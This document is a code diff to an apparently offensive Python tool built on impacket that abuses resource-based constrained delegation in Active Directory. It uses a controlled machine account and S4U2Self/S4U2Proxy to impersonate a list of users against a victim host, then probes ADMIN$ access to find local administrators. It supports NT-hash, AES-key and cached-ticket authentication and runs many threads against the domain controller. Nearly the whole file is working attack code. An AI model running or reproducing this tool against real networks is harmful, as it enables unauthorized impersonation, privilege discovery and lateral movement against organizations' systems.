@@ -1,11 +1,22 @@
+#!/usr/bin/env python3
 import argparse
 import datetime
+import os
 import random
+import socket
 import struct
 import sys
 import threading
+import time
+import warnings
 import concurrent.futures as cf
 from binascii import unhexlify
+from collections import Counter
+from getpass import getpass
+
+# impacket still calls datetime.utcnow() all over the place; we don't want a
+# wall of DeprecationWarnings on top of the progress bar.
+warnings.filterwarnings("ignore", category=DeprecationWarning)
 
 try:
     from tqdm import tqdm
@@ -20,11 +31,66 @@ try:
                                     PA_FOR_USER_ENC, PA_PAC_OPTIONS, EncTGSRepPart,
                                     Ticket as TicketAsn1, seq_set, seq_set_iter)
     from impacket.krb5.types import Principal, Ticket, KerberosTime
-    from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive, KerberosError
+    from impacket.krb5.kerberosv5 import (getKerberosTGT, getKerberosTGS, sendReceive,
+                                          KerberosError)
+    from impacket.krb5.ccache import CCache
     from impacket.krb5.crypto import _HMACMD5, Key, _enctype_table
     from impacket.smbconnection import SMBConnection
 except ImportError as e:
     sys.exit(f"[!] impacket required:  pip install impacket   ({e})")
+
+
+def utcnow():
+    """Timezone-aware UTC now. KerberosTime.to_asn1() only strftime()s it."""
+    return datetime.datetime.now(datetime.timezone.utc)
+
+
+# ---------------------------------------------------------------------------#
+#  Output                                                                     #
+# ---------------------------------------------------------------------------#
+class C:
+    """ANSI colours, neutered when stdout isn't a terminal or NO_COLOR is set."""
+    RESET = BOLD = DIM = RED = GREEN = YELLOW = CYAN = ""
+
+    @classmethod
+    def enable(cls):
+        cls.RESET, cls.BOLD, cls.DIM = "\033[0m", "\033[1m", "\033[2m"
+        cls.RED, cls.GREEN, cls.YELLOW, cls.CYAN = (
+            "\033[31m", "\033[32m", "\033[33m", "\033[36m")
+
+    @classmethod
+    def disable(cls):
+        cls.RESET = cls.BOLD = cls.DIM = cls.RED = cls.GREEN = cls.YELLOW = cls.CYAN = ""
+
+
+if sys.stdout.isatty() and not os.getenv("NO_COLOR"):
+    C.enable()
+
+
+def section(title):
+    print(f"\n{C.CYAN}{C.BOLD}[*] {title}{C.RESET}")
+
+
+def kv(key, value, colour=""):
+    print(f"    {C.DIM}{key:<9}{C.RESET} {colour}{value}{C.RESET}")
+
+
+def rule(title=""):
+    width = 62
+    if title:
+        pad = "-" * max(0, (width - len(title) - 2) // 2)
+        print(f"\n{C.DIM}{pad}{C.RESET} {C.BOLD}{title}{C.RESET} "
+              f"{C.DIM}{pad}{C.RESET}")
+    else:
+        print(f"{C.DIM}{'-' * width}{C.RESET}")
+
+
+def info(msg):
+    print(f"{C.DIM}[i]{C.RESET} {msg}")
+
+
+def die(msg):
+    sys.exit(f"{C.RED}{C.BOLD}[!]{C.RESET}{C.RED} {msg}{C.RESET}")
 
 
 # ---------------------------------------------------------------------------#
@@ -32,7 +98,7 @@ except ImportError as e:
 # ---------------------------------------------------------------------------#
 class Ctx:
     __slots__ = ("tgt", "cipher", "session_key", "domain", "machine_account",
-                 "spn", "kdc", "target", "target_ip", "port", "timeout")
+                 "spn", "kdc", "target", "target_ip", "port", "timeout", "debug")
 
 
 # ---------------------------------------------------------------------------#
@@ -57,7 +123,7 @@ def do_s4u(impersonate, ctx):
         cname = Principal()
         cname.from_asn1(decodedTGT, "crealm", "cname")
         seq_set(auth, "cname", cname.components_to_asn1)
-        now = datetime.datetime.utcnow()
+        now = utcnow()
         auth["cusec"] = now.microsecond
         auth["ctime"] = KerberosTime.to_asn1(now)
         enc = ctx.cipher.encrypt(ctx.session_key, 7, encoder.encode(auth), None)
@@ -104,12 +170,16 @@ def do_s4u(impersonate, ctx):
             Principal(ctx.machine_account,
                       type=constants.PrincipalNameType.NT_UNKNOWN.value).components_to_asn1)
     body["realm"] = str(decodedTGT["crealm"])
-    body["till"] = KerberosTime.to_asn1(datetime.datetime.utcnow() + datetime.timedelta(days=1))
+    body["till"] = KerberosTime.to_asn1(utcnow() + datetime.timedelta(days=1))
     body["nonce"] = random.getrandbits(31)
     seq_set_iter(body, "etype",
                  (int(ctx.cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))
 
-    r = sendReceive(encoder.encode(tgsReq), domain, ctx.kdc)
+    try:
+        r = sendReceive(encoder.encode(tgsReq), domain, ctx.kdc)
+    except KerberosError as e:
+        e.s4u_step = "S4U2Self"
+        raise
     tgs_self = decoder.decode(r, asn1Spec=TGS_REP())[0]
 
     # ---------------------------- S4U2Proxy ------------------------------- #
@@ -144,7 +214,7 @@ def do_s4u(impersonate, ctx):
             Principal(ctx.spn, type=constants.PrincipalNameType.NT_SRV_INST.value).components_to_asn1)
     body["realm"] = domain
     seq_set_iter(body, "additional-tickets", (self_ticket.to_asn1(TicketAsn1()),))
-    body["till"] = KerberosTime.to_asn1(datetime.datetime.utcnow() + datetime.timedelta(days=1))
+    body["till"] = KerberosTime.to_asn1(utcnow() + datetime.timedelta(days=1))
     body["nonce"] = random.getrandbits(31)
     seq_set_iter(body, "etype",
                  (int(constants.EncryptionTypes.rc4_hmac.value),
@@ -152,7 +222,11 @@ def do_s4u(impersonate, ctx):
                   int(constants.EncryptionTypes.des_cbc_md5.value),
                   int(ctx.cipher.enctype)))
 
-    r = sendReceive(encoder.encode(tgsReq), domain, ctx.kdc)
+    try:
+        r = sendReceive(encoder.encode(tgsReq), domain, ctx.kdc)
+    except KerberosError as e:
+        e.s4u_step = "S4U2Proxy"
+        raise
     tgs_proxy = decoder.decode(r, asn1Spec=TGS_REP())[0]
 
     # The TGS-REP enc-part is sealed with the TGT session key (usage 8, no subkey).
@@ -171,9 +245,9 @@ def process(user, ctx):
     try:
         tgs, cipher, sess = do_s4u(user, ctx)
     except KerberosError as e:
-        return user, "noticket", _kerr(e)
+        return (user, *_classify(e, ctx))
     except Exception as e:                       # noqa: BLE001
-        return user, "error", f"s4u: {e}"
+        return user, "error", f"s4u: {_exc(e, ctx)}"
 
     smb = None
     try:
@@ -189,9 +263,9 @@ def process(user, ctx):
         except Exception:                        # ADMIN$ denied => not admin
             return user, "notadmin", ""
     except KerberosError as e:
-        return user, "noticket", _kerr(e)
+        return (user, *_classify(e, ctx))
     except Exception as e:                        # noqa: BLE001
-        return user, "error", f"smb: {e}"
+        return user, "error", f"smb: {_exc(e, ctx)}"
     finally:
         if smb is not None:
             try:
@@ -200,21 +274,126 @@ def process(user, ctx):
                 pass
 
 
+def _classify(e, ctx):
+    """Split the expected Kerberos refusals from real errors.
+
+    The impersonated user travels in PA-FOR-USER, i.e. in *client* position, so
+    an account that doesn't exist comes back as C_PRINCIPAL_UNKNOWN. The S_
+    variant is never about the user list: at S4U2Self it means the KDC doesn't
+    know our own account, at S4U2Proxy that our SPN isn't registered anywhere.
+    """
+    step = getattr(e, "s4u_step", "")
+    try:
+        code = e.getErrorCode()
+    except Exception:
+        return "error", f"{step or 's4u'}: {e}"
+
+    name = _kerr(e)
+    if code == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
+        return "nouser", name
+    if code == constants.ErrorCodes.KDC_ERR_S_PRINCIPAL_UNKNOWN.value:
+        if step == "S4U2Proxy":
+            return "error", f"SPN unknown to the KDC: {ctx.spn}  (fix -target or -spn)"
+        return "error", (f"the KDC does not know your own account "
+                         f"{ctx.machine_account}  (fix the identity)")
+    if code in (constants.ErrorCodes.KDC_ERR_BADOPTION.value,
+                constants.ErrorCodes.KDC_ERR_POLICY.value,
+                constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value):
+        return "noticket", name
+    return "error", f"{step or 's4u'}: {name}"
+
+
 def _kerr(e):
     try:
-        return e.getErrorString()[1]
+        return e.getErrorString()[0]
     except Exception:
         return str(e)
 
 
+def _exc(e, ctx):
+    if ctx.debug:
+        import traceback
+        return traceback.format_exc().strip().replace("\n", " | ")
+    return f"{type(e).__name__}: {e}"
+
+
 # ---------------------------------------------------------------------------#
-def parse_hash(h):
+#  Credential handling (impacket-style).                                      #
+# ---------------------------------------------------------------------------#
+def parse_identity(identity):
+    """domain/username[:password] -> (domain, username, password)"""
+    domain = ""
+    rest = identity
+    if "/" in rest:
+        domain, rest = rest.split("/", 1)
+    username, password = rest, ""
+    if ":" in rest:
+        username, password = rest.split(":", 1)
+    return domain, username, password
+
+
+def parse_hashes(h):
+    if not h:
+        return b"", b""
     h = h.strip()
-    lm, nt = (h.split(":", 1) + [""])[:2] if ":" in h else ("", h)
+    lm, nt = h.split(":", 1) if ":" in h else ("", h)
     lm = lm.strip() or "aad3b435b51404eeaad3b435b51404ee"
     return unhexlify(lm), unhexlify(nt.strip())
 
 
+def tgt_from_ccache(domain, username):
+    """Pull a usable TGT out of KRB5CCNAME. Returns (tgt, cipher, key, user, domain)."""
+    path = os.getenv("KRB5CCNAME")
+    if not path:
+        return None
+    if not os.path.exists(path):
+        die(f"KRB5CCNAME points to a missing file: {path}")
+    ccache = CCache.loadFile(path)
+
+    principal = ccache.principal.toPrincipal()
+    cc_user = "/".join(str(c) for c in principal.components)
+    cc_domain = str(principal.realm)
+    domain = domain or cc_domain
+    username = username or cc_user
+
+    creds = ccache.getCredential(f"krbtgt/{domain.upper()}@{domain.upper()}")
+    if creds is None:
+        return None
+    tgt = creds.toTGT()
+    return tgt["KDC_REP"], tgt["cipher"], tgt["sessionKey"], username, domain.upper()
+
+
+def acquire_tgt(args, domain, username, password, lmhash, nthash):
+    """S4U is Kerberos-only, so a TGT is mandatory; -k only changes where it
+    comes from. Returns (tgt, cipher, sessionKey, username, domain, method)."""
+    if args.k:
+        got = tgt_from_ccache(domain, username)
+        if got is not None:
+            return (*got, f"ccache ({os.getenv('KRB5CCNAME')})")
+        if args.no_pass and not (password or nthash or args.aesKey):
+            die("-k -no-pass but no usable TGT in KRB5CCNAME "
+                f"(need krbtgt/{domain.upper()}@{domain.upper()}).")
+        info(f"{C.YELLOW}no TGT in the ccache, falling back to the supplied "
+             f"credentials.{C.RESET}")
+
+    if not username:
+        die("No username: give one in the identity, or use -k with a ccache.")
+
+    if args.aesKey:
+        method = "AES key -> AS-REQ"
+    elif nthash:
+        method = "NT hash -> AS-REQ"
+    else:
+        method = "password -> AS-REQ"
+
+    tgt, cipher, _old, sess = getKerberosTGT(
+        Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value),
+        password, domain.upper(), lmhash, nthash, args.aesKey or "",
+        args.dc_host or args.dc_ip)
+    return tgt, cipher, sess, username, domain.upper(), method
+
+
+# ---------------------------------------------------------------------------#
 def load_lines(path):
     seen, out = set(), []
     with open(path, encoding="utf-8", errors="ignore") as f:
@@ -227,7 +406,6 @@ def load_lines(path):
 
 
 def load_done(path):
-    import os
     if not path or not os.path.exists(path):
         return set()
     done = set()
@@ -239,115 +417,257 @@ def load_done(path):
     return done
 
 
+def preflight(ctx):
+    """One plain TGS-REQ for the SPN, with our own TGT.
+
+    The KDC answers S_PRINCIPAL_UNKNOWN if the SPN isn't registered anywhere,
+    which is the one mistake that would otherwise fail identically for every
+    single user in the list. Cheap insurance: one round trip.
+    """
+    sname = Principal(ctx.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+    try:
+        getKerberosTGS(sname, ctx.domain, ctx.kdc, ctx.tgt, ctx.cipher, ctx.session_key)
+    except KerberosError as e:
+        if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_S_PRINCIPAL_UNKNOWN.value:
+            die(f"the KDC does not know {ctx.spn}.\n"
+                f"    Check -target, or pass -spn if the host's DNS suffix differs "
+                f"from the AD domain.")
+        die(f"cannot request a ticket for {ctx.spn}: {_kerr(e)}")
+    except Exception as e:                        # noqa: BLE001
+        die(f"preflight against {ctx.kdc or ctx.domain} failed: {e}")
+
+
+def resolve_target(target, domain, target_ip):
+    """'VICTIM$' -> (fqdn, ip). Also accepts a bare name or an FQDN."""
+    name = target.rstrip("$")
+    if "." in name:
+        fqdn = name
+    else:
+        fqdn = f"{name}.{domain.lower()}"
+    if target_ip:
+        return fqdn, target_ip
+    try:
+        return fqdn, socket.gethostbyname(fqdn)
+    except socket.gaierror:
+        die(f"Cannot resolve {fqdn}; pass -target-ip.")
+
+
 def main():
     p = argparse.ArgumentParser(
-        description="Pure-impacket parallel local-admin discovery via RBCD/S4U.")
-    p.add_argument("--target", required=True,
-                   help="Target FQDN used for the cifs SPN, e.g. host.corp.local")
-    p.add_argument("--target-ip", default=None,
-                   help="Target IP (defaults to --target if resolvable).")
-    p.add_argument("--domain", required=True, help="Kerberos realm, e.g. CORP.LOCAL")
-    p.add_argument("--account", required=True, help="Controlled machine account, e.g. 'OWNED$'")
-    p.add_argument("--hash", required=True, help="NT hash of the account (LM:NT or :NT).")
-    p.add_argument("--dc-ip", required=True, help="Domain controller IP/host (KDC).")
-    p.add_argument("--users", required=True, help="File: one AD user per line.")
-    p.add_argument("--output", default="admins.txt", help="Append confirmed admins here.")
-    p.add_argument("--spn", default=None, help="Override SPN (default cifs/<target>).")
-    p.add_argument("--workers", type=int, default=20,
+        add_help=True,
+        description="Parallel local-admin discovery on an RBCD-controlled host, "
+                    "via S4U2Self+S4U2Proxy then an ADMIN$ tree connect.")
+    p.add_argument("identity", help="domain.local/username[:password] of the account "
+                                    "you control, e.g. red.local/ATTACKER$")
+    p.add_argument("-target", required=True, metavar="ACCOUNT",
+                   help="Machine account of the host to test, e.g. 'VICTIM$' "
+                        "(RBCD must already be configured toward your account).")
+    p.add_argument("-users", required=True, help="File: one AD user per line.")
+    p.add_argument("-spn", default=None,
+                   help="Override the SPN requested at S4U2Proxy (default cifs/<target "
+                        "FQDN>). Needed when the host's DNS suffix differs from the AD "
+                        "domain; keep the cifs/ class, SMB won't accept anything else.")
+    p.add_argument("-o", "-outputfile", dest="output", default=None,
+                   help="Append confirmed admins to this file. Off by default: "
+                        "without it, results are only printed.")
+    p.add_argument("-threads", type=int, default=20,
                    help="Concurrent workers (default 20). This hammers the DC; tune it.")
-    p.add_argument("--port", type=int, default=445, help="SMB port (default 445).")
-    p.add_argument("--timeout", type=int, default=10, help="SMB timeout seconds (default 10).")
-    p.add_argument("--resume", action="store_true",
-                   help="Skip users already present in --output.")
-    p.add_argument("--errors-file", default="", help="Optional file to log errored users.")
-    p.add_argument("--verbose-noticket", action="store_true",
-                   help="Also print users for whom no ticket could be obtained.")
+    p.add_argument("-port", type=int, default=445, help="SMB port (default 445).")
+    p.add_argument("-timeout", type=int, default=10, help="SMB timeout seconds (default 10).")
+    p.add_argument("-resume", action="store_true",
+                   help="Skip users already listed in -o (requires -o).")
+    p.add_argument("-errors-file", dest="errors_file", default="",
+                   help="Log skipped/errored users here.")
+    p.add_argument("-v", "-verbose", dest="verbose", action="count", default=0,
+                   help="-v lists the no-ticket and unknown users as they come; "
+                        "-vv also lists every user that simply isn't admin.")
+    p.add_argument("-no-preflight", dest="no_preflight", action="store_true",
+                   help="Skip the one-request SPN sanity check done before the scan.")
+    p.add_argument("-debug", action="store_true", help="Full tracebacks on unexpected errors.")
+    p.add_argument("-no-color", dest="no_color", action="store_true", help="Disable colours.")
+
+    auth = p.add_argument_group(
+        "authentication",
+        "S4U2Self/S4U2Proxy is Kerberos-only, so a TGT for your account is always "
+        "needed. By default it is requested from the KDC with the credentials below; "
+        "-k reuses an existing one instead.")
+    auth.add_argument("-hashes", metavar="LMHASH:NTHASH", default="", help="NTLM hashes.")
+    auth.add_argument("-no-pass", dest="no_pass", action="store_true",
+                      help="Don't ask for a password (useful with -k).")
+    auth.add_argument("-k", action="store_true",
+                      help="Take the TGT from the ccache file (KRB5CCNAME) instead of "
+                           "requesting one. Falls back to the command-line credentials "
+                           "if the ccache holds no usable TGT.")
+    auth.add_argument("-aesKey", metavar="hex key", default="",
+                      help="AES key to use for Kerberos authentication (128 or 256 bits).")
+
+    conn = p.add_argument_group("connection")
+    conn.add_argument("-dc-ip", dest="dc_ip", default=None,
+                      help="IP of the domain controller / KDC. Defaults to the domain part "
+                           "of the identity.")
+    conn.add_argument("-dc-host", dest="dc_host", default=None,
+                      help="Hostname of the KDC. If omitted, -dc-ip is used.")
+    conn.add_argument("-target-ip", dest="target_ip", default=None,
+                      help="IP of -target. Defaults to resolving its FQDN.")
     args = p.parse_args()
 
-    domain = args.domain.upper()
-    lmhash, nthash = parse_hash(args.hash)
+    if args.no_color:
+        C.disable()
 
-    # ---- one-time TGT for the machine account (shared, read-only) ----
-    print(f"[i] Requesting TGT for {args.account}@{domain} ...")
+    domain, username, password = parse_identity(args.identity)
+    lmhash, nthash = parse_hashes(args.hashes)
+
+    if not domain:
+        die("identity must include the domain: domain.local/username[:password]")
+    if args.resume and not args.output:
+        die("-resume needs -o FILE: it skips the users already listed in it.")
+    if not password and not nthash and not args.aesKey and not args.no_pass and not args.k:
+        password = getpass("Password: ")
+
+    section("Authentication")
     try:
-        tgt, cipher, _old, sess = getKerberosTGT(
-            Principal(args.account, type=constants.PrincipalNameType.NT_PRINCIPAL.value),
-            "", domain, lmhash, nthash, b"", args.dc_ip)
+        tgt, cipher, sess, username, domain, method = acquire_tgt(
+            args, domain, username, password, lmhash, nthash)
+    except SystemExit:
+        raise
     except Exception as e:                        # noqa: BLE001
-        sys.exit(f"[!] Could not get TGT for the machine account: {e}")
-    print("[i] TGT OK.")
+        die(f"Could not get a TGT: {e}")
+    kv("account", f"{username}@{domain}", C.BOLD)
+    kv("method", method)
+    kv("KDC", args.dc_host or args.dc_ip or f"{domain.lower()} (DNS)")
+    kv("TGT", "OK", C.GREEN)
+
+    fqdn, target_ip = resolve_target(args.target, domain, args.target_ip)
 
     ctx = Ctx()
     ctx.tgt, ctx.cipher, ctx.session_key = tgt, cipher, sess
     ctx.domain = domain
-    ctx.machine_account = args.account
-    ctx.spn = args.spn or f"cifs/{args.target}"
-    ctx.kdc = args.dc_ip
-    ctx.target = args.target
-    ctx.target_ip = args.target_ip or args.target
+    ctx.machine_account = username
+    ctx.spn = args.spn or f"cifs/{fqdn}"
+    ctx.kdc = args.dc_host or args.dc_ip
+    ctx.target = fqdn
+    ctx.target_ip = target_ip
     ctx.port = args.port
     ctx.timeout = args.timeout
+    ctx.debug = args.debug
+
+    section("Target")
+    kv("host", f"{fqdn} ({target_ip}:{args.port})", C.BOLD)
+    kv("SPN", ctx.spn)
+    kv("check", "S4U2Self + S4U2Proxy, then ADMIN$ tree connect")
+    if not args.no_preflight:
+        preflight(ctx)
+        kv("SPN check", "OK", C.GREEN)
 
     users = load_lines(args.users)
+    skipped = 0
     if args.resume:
         done = load_done(args.output)
         before = len(users)
         users = [u for u in users if u not in done]
-        if before != len(users):
-            print(f"[i] Resume: skipping {before - len(users)} already-done users.")
+        skipped = before - len(users)
+
+    section("Run")
+    kv("users", f"{len(users)}" + (f"  {C.DIM}({skipped} skipped, -resume){C.RESET}"
+                                   if skipped else ""))
+    kv("threads", args.threads)
+    kv("timeout", f"{args.timeout}s  {C.DIM}(SMB){C.RESET}")
+    kv("output", args.output or "stdout only (-o FILE to save)")
+    print()
+
     if not users:
-        print("[i] Nothing to do.")
+        info("Nothing to do.")
         return
 
-    print(f"[i] {len(users)} users | spn={ctx.spn} | workers={args.workers}")
-    print(f"[i] Admins -> {args.output}\n")
-
-    admins, errors, noticket = [], [], []
+    admins, errors, noticket, nouser = [], [], [], []
+    processed = 0
     file_lock = threading.Lock()
-    out_fh = open(args.output, "a", encoding="utf-8")
+    out_fh = open(args.output, "a", encoding="utf-8") if args.output else None
 
-    executor = cf.ThreadPoolExecutor(max_workers=args.workers)
+    executor = cf.ThreadPoolExecutor(max_workers=args.threads)
     futures = {executor.submit(process, u, ctx): u for u in users}
-    bar = tqdm(total=len(futures), unit="usr", dynamic_ncols=True, desc="checking")
+    started = time.monotonic()
+    # leave=False: the bar is erased when it closes, so the summary is what
+    # stays on screen at the end.
+    bar = tqdm(total=len(futures), unit="usr", dynamic_ncols=True, desc="checking",
+               leave=False)
     try:
         for fut in cf.as_completed(futures):
             user, status, detail = fut.result()
             if status == "admin":
                 admins.append(user)
-                with file_lock:
-                    out_fh.write(f"{user}\n")
-                    out_fh.flush()
-                tqdm.write(f"[+] ADMIN     {user}")
+                if out_fh is not None:
+                    with file_lock:
+                        out_fh.write(f"{user}\n")
+                        out_fh.flush()
+                tqdm.write(f"{C.GREEN}{C.BOLD}[+] ADMIN    {user}{C.RESET}")
             elif status == "error":
                 errors.append((user, detail))
+                tqdm.write(f"{C.RED}[!] error    {user}{C.RESET}  {C.DIM}{detail}{C.RESET}")
             elif status == "noticket":
                 noticket.append((user, detail))
-                if args.verbose_noticket:
-                    tqdm.write(f"[-] noticket  {user}  ({detail})")
-            bar.set_postfix(adm=len(admins), notk=len(noticket), err=len(errors))
+                if args.verbose >= 1:
+                    tqdm.write(f"{C.YELLOW}[-] noticket {user}{C.RESET}  "
+                               f"{C.DIM}{detail}{C.RESET}")
+            elif status == "nouser":
+                nouser.append((user, detail))
+                if args.verbose >= 1:
+                    tqdm.write(f"{C.DIM}[-] unknown  {user}{C.RESET}")
+            elif args.verbose >= 2:
+                tqdm.write(f"{C.DIM}[-] no       {user}{C.RESET}")
+            processed += 1
+            bar.set_postfix(adm=len(admins), notk=len(noticket),
+                            nousr=len(nouser), err=len(errors))
             bar.update(1)
     except KeyboardInterrupt:
-        tqdm.write("\n[!] Interrupted; cancelling pending work.")
+        tqdm.write(f"\n{C.RED}[!] Interrupted; cancelling pending work.{C.RESET}")
         executor.shutdown(cancel_futures=True)
     finally:
         bar.close()
-        out_fh.close()
+        if out_fh is not None:
+            out_fh.close()
         executor.shutdown(wait=False)
 
-    if args.errors_file and (errors or noticket):
+    if args.errors_file and (errors or noticket or nouser):
         with open(args.errors_file, "w", encoding="utf-8") as ef:
-            for u, d in errors:
-                ef.write(f"error\t{u}\t{d}\n")
-            for u, d in noticket:
-                ef.write(f"noticket\t{u}\t{d}\n")
+            for tag, rows in (("error", errors), ("noticket", noticket), ("nouser", nouser)):
+                for u, d in rows:
+                    ef.write(f"{tag}\t{u}\t{d}\n")
 
-    print("\n=== Summary ===")
-    print(f"  Admins   : {len(admins)}")
-    print(f"  No ticket: {len(noticket)}  (Protected Users / sensitive / not delegatable)")
-    print(f"  Errors   : {len(errors)}")
+    rule("Summary")
+
+    def tally(label, n, colour, note):
+        colour = colour if n else C.DIM
+        print(f"  {colour}{C.BOLD}{n:>6}{C.RESET}  {colour}{label:<10}{C.RESET}"
+              f"{C.DIM}{note}{C.RESET}")
+
+    tally("admins", len(admins), C.GREEN, "local administrators of the target")
+    tally("no ticket", len(noticket), C.YELLOW,
+          "not delegatable, disabled, locked out or expired")
+    tally("unknown", len(nouser), C.DIM, "no such principal in the realm")
+    tally("errors", len(errors), C.RED, "unexpected failures")
+    print(f"  {C.DIM}{processed:>6}  checked   "
+          f"out of {len(users)} in {time.monotonic() - started:.1f}s{C.RESET}")
+
+    for label, rows, colour in (("no ticket", noticket, C.YELLOW),
+                                ("errors", errors, C.RED)):
+        if rows:
+            print(f"\n  {C.DIM}{label} breakdown:{C.RESET}")
+            for reason, n in Counter(d for _, d in rows).most_common(5):
+                print(f"    {colour}{n:>5}x{C.RESET}  {reason}")
+
+    if (noticket or nouser) and not args.verbose and not args.errors_file:
+        print(f"\n  {C.DIM}(-v lists them live, -errors-file FILE writes them out){C.RESET}")
+
     if admins:
-        head = ", ".join(admins[:25])
-        print("  ->", head + (" ..." if len(admins) > 25 else ""))
+        where = (f"{C.DIM}(also written to {args.output}){C.RESET}" if args.output
+                 else f"{C.DIM}(-o FILE to save them){C.RESET}")
+        print(f"\n  {C.GREEN}{C.BOLD}Local admins{C.RESET} {where}")
+        for user in admins[:25]:
+            print(f"    {C.GREEN}+{C.RESET} {user}")
+        if len(admins) > 25:
+            print(f"    {C.DIM}... and {len(admins) - 25} more{C.RESET}")
+    print()
 
 
 if __name__ == "__main__":
